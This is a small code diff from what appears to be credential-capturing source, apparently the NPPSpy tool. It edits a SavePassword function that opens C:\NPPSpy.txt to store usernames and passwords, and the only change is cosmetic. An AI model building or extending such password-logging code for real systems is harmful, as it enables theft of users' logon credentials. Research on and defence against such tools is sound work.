@@ -44,7 +44,7 @@ void SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 	HANDLE hFile;
 	DWORD dwWritten;
 
-	hFile = CreateFile(L"C:\\NPPSpy.txt",
+	hFile = CreateFile(TEXT("C:\\NPPSpy.txt"),
 		GENERIC_WRITE,
 		0,
 		NULL,
